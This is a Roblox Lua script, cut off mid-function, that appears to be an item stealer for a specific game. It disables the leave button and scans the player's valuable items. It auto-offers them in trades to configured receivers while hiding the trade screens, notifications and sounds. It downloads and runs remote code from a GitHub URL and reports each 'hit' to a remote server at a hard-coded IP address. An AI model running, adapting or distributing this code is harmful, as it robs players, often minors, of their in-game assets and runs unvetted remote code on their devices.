-- discord.gg/syncrypt

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)

		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end

	return function()
		local r = table.pack(f(s, c))

		if r[1] == nil then
			return false
		end

		c = r[1]

		return true, table.unpack(r, 1, r.n)
	end
end

if getgenv().__ELYSIUM_SAB_RAN then
	return
end

getgenv().__ELYSIUM_SAB_RAN = true

if game.PlaceId ~= 109983668079237 and game.PlaceId ~= 99606176102979 then
	game.Players.LocalPlayer:Kick("Wrong game")

	return
end

if game.PlaceId == 99606176102979 then
	return
end

if not game:IsLoaded() then
	game.Loaded:Wait()
end

task.spawn(function()
	while task.wait() do
		pcall(function()
			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
				v:Disable()
			end
		end)
	end
end)

if not isfolder("vex_dumps") then
	pcall(makefolder, "vex_dumps")
end

local u6

local function v7(p1)
	if not u6 then
		u6 = string.format("%s/sab_%d.txt", "vex_dumps", os.time())
		pcall(writefile, u6, "=== SAB LOG " .. os.date() .. " ===\n")
	end

	if type(appendfile) == "function" then
		pcall(appendfile, u6, os.date("[%H:%M:%S] ") .. p1 .. "\n")
	end
end
local function v8()
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local v16 = HttpService
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local v19 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())

local function v20()
	local ok, result = pcall(function()
		return game:HttpGet(v19)
	end)

	if ok and result then
		local match = result:match("^%s*(.-)%s*$")

		if match and match ~= "" then
			local match2 = match:match("^https?://") and match or "http://" .. match

			return match2
		end
	end

	return "http://212.119.42.158:3000"
end

if not getgenv().SAB_API_BASE then
	getgenv().SAB_API_BASE = v20()
end

local SAB_API_BASE = getgenv().SAB_API_BASE

local function v26()
	return syn and syn.request or http and http.request or type(request) == "function" and request or type(http_request) == "function" and http_request or nil
end

local RECEIVERS = getgenv().RECEIVERS or {}
local THRESHOLD = getgenv().THRESHOLD or 1000000

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/ps.lua"))()
end)

local PRIORITY = getgenv().PRIORITY or {
	"Meowl",
	"Strawberry elephant",
	"Skibidi toilet",
	"Headless horseman",
	"Dragon Cannelloni",
	"Hydra dragon cannelloni",
	"Dragon Gingerini",
	"Capitano moby",
	"La casa boo",
	"Fragrama and chocrama",
	"La supreme combinasion",
	"Cooki and milki",
	"Burguro and fryuro",
	"Garama and madungdung",
	"La secret combinasion",
	"Spooky and pumpky",
	"Reinito sleighito",
	"Ketchuru and musturu",
	"La taco combinasion",
	"Tralaledon",
	"Eviledon",
	"Los bros",
	"Tictac sahur",
	"Cerberus",
	"Celestial Pegasus",
	"Love Love Bear",
	"Festive 67",
	"Ginger Gerat",
	"Ketupat Bros",
	"Rosey and Teddy"
}
local t1 = {}

for _, v in ipairs(PRIORITY) do
	t1[v:lower()] = true
end

local t2 = {}

for _, v in ipairs({
	"meowl",
	"strawberry elephant",
	"skibidi toilet",
	"headless horseman",
	"dragon cannelloni",
	"hydra dragon cannelloni",
	"dragon gingerini",
	"love love bear",
	"signore carapace",
	"elefanto frigo",
	"griffin",
	"john pork",
	"digi narwhal",
	"la supreme combinasion"
}) do
	t2[v:lower()] = true
end

local t3 = {
	["rainbow hammer"] = true,
	["bloodmoon hammer"] = true,
	["candy sentry"] = true,
	["santa's sleigh"] = true,
	waverider = true,
	["cupid's wings"] = true,
	["witch's broom"] = true
}
local t4 = {
	tralalero = true
}
local WEBHOOK = getgenv().WEBHOOK or ""
local t5 = {}
local t6 = {}

for _, v in ipairs(RECEIVERS) do
	local match = tostring(v):match("^%s*(.-)%s*$")

	if match ~= "" and not t5[match:lower()] then
		t5[match:lower()] = true
		t6[#t6 + 1] = match
	end
end

local function v44(p2)
	return t5[tostring(p2):lower()] == true
end

local u45 = false
local u46 = false
local t7 = {}
local t8 = {}
local u49 = false
local t9 = {
	K = 1000,
	M = 1000000,
	B = 1e9,
	T = 1e12,
	k = 1000,
	m = 1000000,
	b = 1e9,
	t = 1e12
}

local function v51(p3)
	if not p3 or p3 == "" then
		return 0
	end

	local match, v53 = tostring(p3):gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub("/s", ""):gsub("/S", ""):match("([%d%.]+)([KMBTkmbt]?)")

	return (tonumber(match) or 0) * (t9[v53] or 1)
end
local function v54(p4)
	local v55 = tonumber(p4) or 0

	if v55 >= 1e12 then
		local v56 = string.format("%.1fT", v55 / 1e12)

		return "$" .. (v56:find("%.0T") and v56:gsub("%.0T", "T") or v56)
	end

	if v55 >= 1e9 then
		local v57 = string.format("%.1fB", v55 / 1e9)

		return "$" .. (v57:find("%.0B") and v57:gsub("%.0B", "B") or v57)
	end

	if v55 >= 1000000 then
		local v58 = string.format("%.1fM", v55 / 1000000)

		return "$" .. (v58:find("%.0M") and v58:gsub("%.0M", "M") or v58)
	end

	if not (v55 >= 1000) then
		return "$" .. tostring(math.floor(v55))
	end

	local v59 = string.format("%.1fK", v55 / 1000)

	return "$" .. (v59:find("%.0K") and v59:gsub("%.0K", "K") or v59)
end
local function v60(p5)
	if not p5 then
		return ""
	end

	if p5:IsA("TextLabel") or p5:IsA("TextButton") then
		return p5.ContentText or p5.Text or ""
	end

	return ""
end

local t10 = {}

pcall(function()
	local Traits = require(ReplicatedStorage.Datas.Traits)

	for k, Trait in pairs(Traits) do
		if type(Trait) == "table" then
			local match = tostring(Trait.Icon or ""):match("%d+")
			local match2 = tostring(Trait.Display or k):match("^%s*(.-)%s*$")

			if match and match2 ~= "" then
				t10[match] = match2
			end
		end
	end
end)

local function v67()
	pcall(function()
		local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

		if HumanoidRootPart then
			LocalPlayer:RequestStreamAroundAsync(HumanoidRootPart.Position)
		end
	end)

	local Plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 60)

	if not Plots then
		return nil
	end

	for _, child in ipairs(Plots:GetChildren()) do
		for _, v in ipairs({
			"UserId",
			"OwnerId",
			"OwnerUserId",
			"PlayerUserId",
			"PlotOwner"
		}) do
			local attribute = child:GetAttribute(v)

			if not (attribute and tonumber(attribute) == LocalPlayer.UserId) then
				continue
			end

			return child
		end

		local PlotSign = child:FindFirstChild("PlotSign")

		if not PlotSign then
			continue
		end

		local SurfaceGui = PlotSign:FindFirstChild("SurfaceGui")
		local Frame = SurfaceGui and SurfaceGui:FindFirstChild("Frame")
		local TextLabel = Frame and Frame:FindFirstChild("TextLabel")

		if not TextLabel then
			continue
		end

		local ContentText = TextLabel.ContentText or TextLabel.Text or ""

		if ContentText ~= LocalPlayer.DisplayName and ContentText ~= LocalPlayer.Name and (not ContentText:find(LocalPlayer.DisplayName, 1, true) or not ContentText:find("Base", 1, true)) then
			continue
		end

		return child
	end

	return nil
end
local function v80(p6)
	if not p6 then
		return nil
	end

	local DisplayName = p6:FindFirstChild("DisplayName", true) or p6:FindFirstChild("Name", true)

	if not DisplayName then
		return nil
	end

	local t11 = {
		name = v60(DisplayName),
		mutationStr = "",
		traitStr = "",
		moneyPerSec = 0
	}

	if t11.name == "" then
		t11.name = "Unknown"
	end

	local Generation = p6:FindFirstChild("Generation", true) or p6:FindFirstChild("Gen", true)

	if Generation then
		t11.moneyPerSec = v51(v60(Generation))
	end

	local t12 = {}

	for _, descendant in ipairs(p6:GetDescendants()) do
		if descendant:IsA("TextLabel") and descendant.Name == "Mutation" and descendant.Visible ~= false then
			local v87 = v60(descendant)

			if v87 ~= "" then
				table.insert(t12, v87)
			end
		end
	end

	t11.mutationStr = #t12 > 0 and table.concat(t12, ", ") or ""

	local Traits = p6:FindFirstChild("Traits", true)

	if Traits then
		local t13 = {}
		local t14 = {}

		for _, descendant in ipairs(Traits:GetDescendants()) do
			if descendant:IsA("ImageLabel") and descendant.Visible ~= false then
				local match = tostring(descendant.Image or ""):match("%d+")
				local match2 = match and t10[match] or nil

				if not match2 and descendant.Name ~= "Template" then
					match2 = tostring(descendant.Name):match("^%s*(.-)%s*$")
				end

				if match2 and match2 ~= "" and not t14[match2] then
					t14[match2] = true
					table.insert(t13, match2)
				end
			end
		end

		t11.traitStr = #t13 > 0 and table.concat(t13, ", ") or ""
	end

	return t11
end
local function v95()
	local v96 = v67()

	if not v96 then
		return {}
	end

	local t15 = {}
	local t16 = {}

	local function v99(p7)
		local v100 = v80(p7)

		if not v100 then
			return
		end

		local v101 = v100.name .. "|" .. tostring(v100.moneyPerSec)

		if t16[v101] then
			return
		end

		t16[v101] = true
		table.insert(t15, v100)
	end

	local Debris = Workspace:FindFirstChild("Debris")
	local Plots = Workspace:FindFirstChild("Plots")
	local t17 = {}

	if Plots then
		for _, child in ipairs(Plots:GetChildren()) do
			local ok, result = pcall(function()
				return child:GetPivot()
			end)

			if ok and result then
				table.insert(t17, {
					plot = child,
					position = result.Position
				})
			end
		end
	end

	local function v109(p8)
		local huge = math.huge
		local plot

		for _, v in ipairs(t17) do
			local v114 = p8.X - v.position.X
			local v115 = p8.Z - v.position.Z
			local v116 = v114 * v114 + v115 * v115

			if v116 < huge then
				plot = v.plot
				huge = v116
			end
		end

		return plot
	end

	if Debris then
		for _, child in ipairs(Debris:GetChildren()) do
			if child.Name == "FastOverheadTemplate" then
				if child:IsA("BasePart") and v109(child.Position) == v96 then
					v99(child:FindFirstChild("AnimalOverhead"))
				end
			end
		end
	end

	for _, descendant in ipairs(v96:GetDescendants()) do
		if descendant.Name == "AnimalOverhead" then
			v99(descendant)
		end
	end

	table.sort(t15, function(p9, p10)
		local v121 = t1[p9.name:lower()] or false

		if v121 == (t1[p10.name:lower()] or false) then
			return p9.moneyPerSec > p10.moneyPerSec
		end

		return v121
	end)

	return t15
end

local t18 = {}

local function v123(p11)
	return t3[tostring(p11):lower()] == true
end
local function v124(p12)
	return t4[tostring(p12):lower()] == true
end
local function v125()
	local t19 = {}
	local t20 = {}
	local t21 = {}

	t18 = {}

	local ok, result = pcall(function()
		local Gears = require(ReplicatedStorage.Shared.Gears)

		local function v132(p13)
			if not p13 then
				return
			end

			for _, child in ipairs(p13:GetChildren()) do
				if child:IsA("Tool") and Gears.IsTradable(child.Name) and v123(child.Name) then
					if not t20[child.Name] then
						t20[child.Name] = true
						t18[#t18 + 1] = {
							kind = "gear",
							name = child.Name
						}
						table.insert(t19, "[GEAR] " .. child.Name)
					end
				end
			end
		end

		v132(LocalPlayer:FindFirstChildOfClass("Backpack"))
		v132(LocalPlayer.Character)
	end)

	if not ok then
		v8("Gear scan failed: " .. tostring(result))
	end

	local ok2, result2 = pcall(function()
		local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
		local Settings = PlayerGui:WaitForChild("Settings", 5)

		if not Settings then
			v8("Settings ScreenGui missing (5s timeout)")

			return
		end

		local Settings2 = Settings:WaitForChild("Settings", 3)

		if not Settings2 then
			v8("Settings inner frame missing (3s timeout)")

			return
		end

		local Enabled = Settings.Enabled
		local Visible = Settings2.Visible

		Settings.Enabled = false
		InterfaceController:SetState("Settings", true)

		local v142 = os.clock() + 2
		local BaseSkin

		while true do
			BaseSkin = Settings2.Content.ScrollingFrame:FindFirstChild("Base Skin")

			if BaseSkin then
				break
			else
				task.wait(0.1)

				if v142 <= os.clock() then
					break
				end
			end
		end

		if BaseSkin then
			local Text = BaseSkin.Button.Text.Text

			if Text ~= "" and Text ~= "Normal" and Text ~= "Default" and v124(Text) then
				t21[Text] = true
				t18[#t18 + 1] = {
					kind = "skin",
					name = Text
				}
				table.insert(t19, "[BASE SKIN] " .. Text)
			end

			for _, child in ipairs(BaseSkin.Button.DropDown:GetChildren()) do
				if child:IsA("GuiButton") and child.Name ~= "Template" then
					local Locked = child:FindFirstChild("Locked")

					if not (Locked and Locked.Visible) and child.Name ~= "Normal" and not (not v124(child.Name) or t21[child.Name]) then
						t21[child.Name] = true
						t18[#t18 + 1] = {
							kind = "skin",
							name = child.Name
						}
						table.insert(t19, "[BASE SKIN] " .. child.Name)
					end
				end
			end
		else
			v8("Base Skin section not found in Settings UI")
		end

		if not Visible then
			InterfaceController:SetState("Settings", false)
		end

		Settings.Enabled = Enabled
	end)

	if not ok2 then
		warn("[SAB] Base skin scan failed:", tostring(result2))
		pcall(function()
			PlayerGui.Settings.Enabled = true
		end)
	end

	return t19
end
local function v148()
	for _, v in ipairs(v95()) do
		if t1[v.name:lower()] then
			return true
		end

		if THRESHOLD <= 0 or THRESHOLD <= v.moneyPerSec then
			return true
		end
	end

	for _, v in ipairs(t18) do
		if v.kind == "gear" or v.kind == "skin" then
			return true
		end
	end

	return false
end
local function v153(p14)
	if not p14 then
		return false
	end

	for _, v in ipairs({
		"Activated",
		"MouseButton1Click",
		"MouseButton1Down"
	}) do
		local ok, result = pcall(getconnections, p14[v])

		if not ok then
			continue
		end

		if #result ~= 0 then
			for _, v2 in ipairs(result) do
				if type(v2.Function) ~= "function" or not pcall(v2.Function) then
					pcall(function()
						v2:Fire()
					end)

					continue
				end

				return true
			end

			return true
		end
	end

	pcall(function()
		p14:SimulateClick()
	end)

	return false
end

local t22 = {
	active = false,
	suppressLiveTrade = false,
	heartbeatConn = nil,
	childAddedConn = nil,
	suppressedGuis = {
		"TradePlayerList",
		"TradePrompts"
	},
	_lcInterface = nil,
	_hudInterface = nil,
	_origNotifMethods = {},
	hooksInstalled = false
}

t22.hookCamera = function()
	local ok, result = pcall(require, ReplicatedStorage.Controllers.CameraController)

	if ok then
		if type(result) == "table" then
			for _, v in ipairs({
				"Blur",
				"Fov",
				"SetBlur",
				"SetFov",
				"TweenBlur",
				"TweenFov"
			}) do
				local v165 = result[v]

				if type(v165) == "function" then
					result[v] = function(...)
						if t22.active then
							return
						end

						return v165(result, select(2, ...))
					end
				end
			end

			local BlurEffect = Lighting:FindFirstChildOfClass("BlurEffect")

			if BlurEffect then
				BlurEffect.Size = 0
			end

			return
		end
	end
end
t22.hookInterface = function(p15)
	local ok, result = pcall(require, ReplicatedStorage.Controllers.InterfaceController)

	if not ok or type(result) ~= "table" then
		return
	end

	local interfaces = result:GetInterfaces()

	if interfaces then
		p15._lcInterface = interfaces.LeftCenter
		p15._hudInterface = interfaces.Hud
	end

	local function v170(p16)
		if p16 then
			if type(p16.Close) == "function" then
				local Close = p16.Close

				p16.Close = function(p17, ...)
					if not t22.active then
						return Close(p17, ...)
					end

					if p17.ToggleTween then
						p17.ToggleTween:Cancel()
						p17.ToggleTween = nil
					end

					p17.State = true

					if p17.Object then
						p17.Object.Visible = true
					end

					if p17.Defaults and p17.Object then
						p17.Object.Position = p17.Defaults.Position
					end
				end

				return
			end
		end
	end

	v170(p15._lcInterface)
	v170(p15._hudInterface)

	local Toggle = result.Toggle

	if type(Toggle) == "function" then
		result.Toggle = function(p18, p19, p20, p21, ...)
			if t22.active and (p19 == "TradePlayerList" or p19 == "TradePrompts") and (p20 == true or p20 == nil) then
				return
			end

			return Toggle(result, p19, p20, p21, ...)
		end
	end

	local SetState = result.SetState

	if type(SetState) == "function" then
		result.SetState = function(p22, p23, p24, ...)
			if t22.active and (p23 == "TradePlayerList" or p23 == "TradePrompts") and (p24 == true or p24 == nil) then
				return
			end

			return SetState(result, p23, p24, ...)
		end
	end
end
t22.hookNotifications = function(p25)
	local ok, result = pcall(require, ReplicatedStorage.Controllers.NotificationController)

	if ok and type(result) == "table" then
		for _, v in ipairs({
			"Notify",
			"Error",
			"Success"
		}) do
			local v178 = result[v]

			if type(v178) == "function" then
				p25._origNotifMethods[v] = v178
				result[v] = function()
				end
			end
		end
	end
end
t22.disableAllSuppressed = function(p26)
	for _, suppressedGui in ipairs(p26.suppressedGuis) do
		local v181 = PlayerGui:FindFirstChild(suppressedGui)

		if v181 and v181:IsA("ScreenGui") and v181.Enabled then
			v181.Enabled = false
		end
	end
end
t22.hideLiveTradeFrame = function()
	local TradeLiveTrade = PlayerGui:FindFirstChild("TradeLiveTrade")

	if TradeLiveTrade then
		if TradeLiveTrade:IsA("ScreenGui") and TradeLiveTrade.Enabled then
			TradeLiveTrade.Enabled = false
		end
	end
end
t22.showLiveTradeFrame = function()
	local TradeLiveTrade = PlayerGui:FindFirstChild("TradeLiveTrade")

	if TradeLiveTrade and TradeLiveTrade:IsA("ScreenGui") and not TradeLiveTrade.Enabled then
		TradeLiveTrade.Enabled = true
	end
end
t22.setSuppressLiveTrade = function(p27, p28)
	local v184 = p28

	p27.suppressLiveTrade = v184 and true or false

	if p27.suppressLiveTrade then
		p27:hideLiveTradeFrame()
	else
		p27:showLiveTradeFrame()
	end
end
t22.restoreLeftCenter = function(p29)
	local LeftCenter = PlayerGui:FindFirstChild("LeftCenter")

	if LeftCenter then
		if not LeftCenter.Enabled then
			LeftCenter.Enabled = true
		end

		local LeftCenter2 = LeftCenter:FindFirstChild("LeftCenter")

		if LeftCenter2 then
			if not LeftCenter2.Visible then
				LeftCenter2.Visible = true
			end

			if p29._lcInterface then
				if p29._lcInterface.ToggleTween then
					p29._lcInterface.ToggleTween:Cancel()
					p29._lcInterface.ToggleTween = nil
				end

				if p29._lcInterface.Defaults and p29._lcInterface.Object then
					LeftCenter2.Position = p29._lcInterface.Defaults.Position
				end
			end

			local Buttons = LeftCenter2:FindFirstChild("Buttons")

			if Buttons and not Buttons.Visible then
				Buttons.Visible = true
			end
		end
	end

	local Hud = PlayerGui:FindFirstChild("Hud")

	if Hud then
		if not Hud.Enabled then
			Hud.Enabled = true
		end

		if p29._hudInterface then
			if p29._hudInterface.ToggleTween then
				p29._hudInterface.ToggleTween:Cancel()
				p29._hudInterface.ToggleTween = nil
			end

			if p29._hudInterface.Defaults and p29._hudInterface.Object then
				local Hud2 = Hud:FindFirstChild("Hud")

				if Hud2 then
					Hud2.Position = p29._hudInterface.Defaults.Position
				end
			end
		end
	end
end
t22.resetCamera = function()
	local CurrentCamera = Workspace.CurrentCamera

	if not CurrentCamera then
		return
	end

	CurrentCamera.FieldOfView = 70

	local BlurEffect = Lighting:FindFirstChildOfClass("BlurEffect")

	if BlurEffect then
		BlurEffect.Size = 0
	end
end
t22.hookChildAdded = function(p30)
	if p30.childAddedConn then
		p30.childAddedConn:Disconnect()
	end

	p30.childAddedConn = PlayerGui.ChildAdded:Connect(function(child)
		if not child:IsA("ScreenGui") then
			return
		end

		for _, suppressedGui in ipairs(t22.suppressedGuis) do
			if child.Name == suppressedGui then
				child.Enabled = false
				child:GetPropertyChangedSignal("Enabled"):Connect(function()
					if t22.active and child.Enabled then
						child.Enabled = false
					end
				end)

				return
			end
		end
	end)
end
t22.installHooks = function(p31)
	if p31.hooksInstalled then
		return
	end

	p31:hookCamera()
	p31:hookInterface()
	p31:hookNotifications()
	p31:hookChildAdded()
	p31:disableAllSuppressed()
	p31:resetCamera()
	p31.hooksInstalled = true
end
t22.start = function(p32)
	if p32.active then
		return
	end

	p32:installHooks()
	p32.active = true
	p32.heartbeatConn = RunService.Heartbeat:Connect(function()
		if not t22.active then
			return
		end

		p32:disableAllSuppressed()
		p32:resetCamera()
		p32:restoreLeftCenter()

		if p32.suppressLiveTrade then
			p32:hideLiveTradeFrame()
		end
	end)
end
t22:start()
v8("TradeSuppressor started")

local n1 = 0

pcall(function()
	local SoundController = require(ReplicatedStorage.Controllers.SoundController)

	if type(SoundController) ~= "table" then
		return
	end

	if not getgenv().OriginalTradePlaySound then
		getgenv().OriginalTradePlaySound = SoundController.PlaySound
	end

	local OriginalTradePlaySound = getgenv().OriginalTradePlaySound

	if type(OriginalTradePlaySound) ~= "function" then
		return
	end

	SoundController.PlaySound = function(p33, p34, ...)
		if n1 > 0 and p34 == "Sounds.Sfx.Activated" then
			return
		end

		local v197 = table.pack(...)

		v197.n = 3 + v197.n - 1
		table.move(v197, 1, v197.n, 3, v197)
		v197[1] = p33
		v197[2] = p34

		return OriginalTradePlaySound(table.unpack(v197, 1, v197.n))
	end
end)

local function v198(p35, ...)
	n1 += 1

	local v199 = table.pack(pcall(p35, ...))

	n1 = math.max(0, n1 - 1)

	return table.unpack(v199, 1, v199.n)
end
local function v200(p36)
	if not p36 then
		return false
	end

	for _, v in ipairs({
		"Activated",
		"MouseButton1Click",
		"MouseButton1Down"
	}) do
		local ok, result = pcall(getconnections, p36[v])

		if not ok or #result == 0 then
			continue
		end

		for _, v2 in ipairs(result) do
			if type(v2.Function) ~= "function" or not v198(v2.Function) then
				v198(function()
					v2:Fire()
				end)

				continue
			end

			return true
		end

		return true
	end

	pcall(function()
		p36:SimulateClick()
	end)

	return false
end
local function v207()
	local TradeLiveTrade = PlayerGui:FindFirstChild("TradeLiveTrade")

	if TradeLiveTrade then
		return TradeLiveTrade:FindFirstChild("TradeLiveTrade")
	end

	return nil
end
local function v209(p37)
	local v210 = p37
	local v211 = v210 or v207()

	return v211 ~= nil and v211.Visible == true
end
local function v212()
	local v213 = v207()

	if not v213 then
		return 0
	end

	local Your = v213:FindFirstChild("Your")
	local ScrollingFrame = Your and Your:FindFirstChild("ScrollingFrame")

	if not ScrollingFrame then
		return 0
	end

	local n2 = 0

	for _, child in ipairs(ScrollingFrame:GetChildren()) do
		if child:IsA("Frame") then
			if child.Name:match("^Selection_") then
				local Spacer = child:FindFirstChild("Spacer")
				local UIStroke = Spacer and Spacer:FindFirstChildOfClass("UIStroke")

				if UIStroke and UIStroke.Color == Color3.fromRGB(0, 255, 0) then
					n2 += 1
				end
			end
		end
	end

	return n2
end

local n3 = 0

local function v222()
	local v223 = tick() - n3

	if v223 < 0.25 then
		task.wait(0.25 - v223)
	end
end
local function v224(p38)
	local Spacer = p38:FindFirstChild("Spacer")

	if not Spacer or not Spacer:IsA("GuiButton") then
		return nil
	end

	local Title = Spacer:FindFirstChild("Title")
	local Cash = Spacer:FindFirstChild("Cash")
	local Text = Title and Title.Text or ""

	if Text == "" then
		return nil
	end

	local v229 = Text:lower()
	local v230 = v51(Cash and Cash.Text or "")

	if p38.Name:match("^Selection_Brainrot_") then
		return {
			spacer = Spacer,
			kind = "brainrot",
			name = Text,
			nl = v229,
			gen = v230,
			isPriority = t1[v229] or false
		}
	end

	if not p38.Name:match("^Selection_Gear_") then
		if not p38.Name:match("^Selection_BaseSkin_") then
			return nil
		end

		if v124(v229) then
			return {
				spacer = Spacer,
				kind = "skin",
				name = Text,
				nl = v229,
				gen = v230
			}
		end

		return nil
	end

	if v123(v229) then
		return {
			spacer = Spacer,
			kind = "gear",
			name = Text,
			nl = v229,
			gen = v230
		}
	end

	return nil
end
local function v231(p39)
	if not p39 then
		return false
	end

	if p39.kind == "gear" or p39.kind == "skin" then
		return true
	end

	if p39.isPriority then
		return true
	end

	if THRESHOLD <= 0 then
		return true
	end

	return p39.gen >= THRESHOLD
end
local function v232(p40)
	if p40.kind == "brainrot" and p40.isPriority then
		return 1
	end

	if p40.kind == "gear" then
		return 2
	end

	if p40.kind == "skin" then
		return 3
	end

	return 4
end
local function v233(p41)
	local Your = p41:FindFirstChild("Your")

	if not Your then
		v8("No Your frame")

		return
	end

	local ScrollingFrame = Your:FindFirstChild("ScrollingFrame")

	if not ScrollingFrame then
		v8("No ScrollingFrame")

		return
	end

	local SideButtons = p41:FindFirstChild("Side Buttons")

	if SideButtons then
		for _, v in ipairs({
			"Brainrots",
			"Gears",
			"BaseSkins"
		}) do
			local v239 = SideButtons:FindFirstChild(v)

			if v239 then
				v200(v239)
				task.wait(0.05)
			end
		end

		local Brainrots = SideButtons:FindFirstChild("Brainrots")

		if Brainrots then
			v200(Brainrots)
			task.wait(0.05)
		end
	end

	local now = tick()
	local n4 = 0
	local n5 = 0

	repeat
		local itemsStable = 0

		for _, child in ipairs(ScrollingFrame:GetChildren()) do
			if child:IsA("Frame") then
				if child.Name:match("^Selection_") then
					itemsStable += 1
				end
			end
		end

		if itemsStable > 0 and itemsStable == n4 then
			n5 += 0.03
		else
			n5 = 0
		end

		n4 = itemsStable

		if n5 >= 0.1 then
			v8("Items stable: " .. itemsStable)

			break
		end

		task.wait(0.03)
	until tick() - now > 10

	if n4 == 0 then
		v8("No items loaded — aborting add")

		return
	end

	local n6 = 0
	local t23 = {}
	local v249 = tick() + 120

	while tick() < v249 do
		if not v209() then
			v8("Trade closed during add")

			break
		end

		local children = ScrollingFrame:GetChildren()
		local t24 = {}

		for _, child in ipairs(children) do
			local v254 = v224(child)

			if v254 and v231(v254) then
				if (t23[v254.kind .. ":" .. v254.name] or 0) < 3 then
					t24[#t24 + 1] = v254
				end
			end
		end

		if #t24 == 0 then
			v8("No more eligible items (all retried or none found)")

			break
		end

		local v255
		local huge = math.huge

		for _, v in ipairs(t24) do
			local v259 = v232(v)

			if not (v259 < huge) then
				if v259 ~= huge then
					continue
				end

				if not ((v255 and v255.gen or 0) < (v.gen or 0)) then
					continue
				end
			end

			v255 = v
			huge = v259
		end

		if v255 then
			local v260 = v255.kind .. ":" .. v255.name

			v222()

			local v261 = v212()

			v200(v255.spacer)

			local v262 = tick() + 1.2
			local v263 = false

			while tick() < v262 do
				if v261 < v212() then
					v263 = true

					break
				end

				task.wait(0.02)
			end

			if v263 then
				t23[v260] = 3
				n6 += 1
				n3 = tick()
				v8(("OK %s [%s] gen=%s (%d)"):format(v255.name, v255.kind, v54(v255.gen), n6))
			else
				t23[v260] = (t23[v260] or 0) + 1
				v8(("MISS %s [%s] (attempt %d/%d)"):format(v255.name, v255.kind, t23[v260], 3))
			end

			task.wait(0.3 + math.random() * 0.1)

			continue
		end

		break
	end

	v8(("Add complete: %d items offered"):format(n6))
end
local function v264(p42)
	local Other = p42:FindFirstChild("Other")

	if not Other then
		v8("No Other frame")

		return
	end

	local ReadyButton = Other:FindFirstChild("ReadyButton")

	if not ReadyButton then
		v8("No ReadyButton")

		return
	end

	local offered = v212()

	v8("Offered: " .. offered)

	if offered == 0 then
		v8("Nothing offered — cancelling")

		local Cancel = Other:FindFirstChild("Cancel")

		if Cancel then
			v200(Cancel)
		end

		return
	end

	v8("Clicking Ready (persistent)...")

	local v269 = tick() + 60

	while tick() < v269 do
		if not v209(p42) then
			return
		end

		local Txt = ReadyButton:FindFirstChild("Txt")

		if Txt and (Txt.Text == "READY" or Txt.Text == "ACCEPT") then
			task.wait(0.05)

			if not v209(p42) then
				return
			end

			local Txt2 = ReadyButton:FindFirstChild("Txt")

			if Txt2 and (Txt2.Text == "READY" or Txt2.Text == "ACCEPT") then
				v8("Ready confirmed")

				break
			end

			v8("Ready state lost — re-clicking...")
		end

		v200(ReadyButton)

		local v272 = tick() + 1

		while true do
			if tick() < v272 then
				local Txt2 = ReadyButton:FindFirstChild("Txt")

				if not Txt2 or Txt2.Text ~= "READY" and Txt2.Text ~= "ACCEPT" then
					task.wait(0.02)

					continue
				end

				break
			end

			break
		end
	end

	v8("Waiting for other player...")

	local v274 = tick() + 120

	while tick() < v274 do
		if not v209(p42) then
			return
		end

		if ReadyButton.BackgroundColor3 == Color3.fromRGB(81, 158, 86) then
			break
		end

		task.wait(0.03)
	end

	if not v209(p42) then
		return
	end

	v8("All ready")
	v8("Clicking Accept (persistent)...")

	local v275 = tick() + 60

	while tick() < v275 do
		if not v209(p42) then
			return
		end

		if ReadyButton.BackgroundColor3 == Color3.fromRGB(81, 158, 86) then
			v200(ReadyButton)

			local v276 = tick() + 1

			while tick() < v276 do
				if not v209(p42) then
					return
				end

				task.wait(0.02)
			end
		end

		task.wait(0.05)
	end

	v8("Waiting for trade to close...")

	local v277 = tick() + 90

	while tick() < v277 do
		if not v209(p42) then
			v8("Trade closed")

			return
		end

		task.wait(0.05)
	end
end
local function v278(p43)
	local v279 = v26()

	if not v279 then
		return false
	end

	local ok, result = pcall(function()
		return v279({
			Url = SAB_API_BASE .. "/signal-hit-sab",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
			},
			Body = HttpService:JSONEncode({
				place_id = tostring(game.PlaceId),
				job_id = tostring(game.JobId),
				sender = LocalPlayer.Name,
				target_players = { p43:lower() },
				game_type = "sab",
				expiry_seconds = 300
			})
		})
	end)
	local StatusCode = ok and result and result.StatusCode

	StatusCode = StatusCode and result.StatusCode >= 200 and result.StatusCode < 300

	return StatusCode
end
local function v283(p44, p45)
	v8("Trade flow start: " .. tostring(p44))
	task.wait(0.2)
	v233(p45)
	v264(p45)

	local v284 = tick() + 180

	while tick() < v284 and p45.Visible do
		task.wait(0.3)
	end

	u45 = false
	t7[p44] = tick()
	v8("Trade flow end: " .. tostring(p44))

	if not t8[p44] then
		t8[p44] = true
		task.spawn(function()
			pcall(v278, p44)
		end)
	end
end

local u285 = false

local function v286()
	if u285 then
		return
	end

	local TradeLiveTrade = PlayerGui:WaitForChild("TradeLiveTrade", 30)

	if not TradeLiveTrade then
		v8("TradeLiveTrade ScreenGui missing")

		return
	end

	local TradeLiveTrade2 = TradeLiveTrade:WaitForChild("TradeLiveTrade", 30)

	if not TradeLiveTrade2 then
		v8("TradeLiveTrade inner missing")

		return
	end

	u285 = true

	local Visible = TradeLiveTrade2.Visible

	if Visible then
		t22:setSuppressLiveTrade(true)
	end

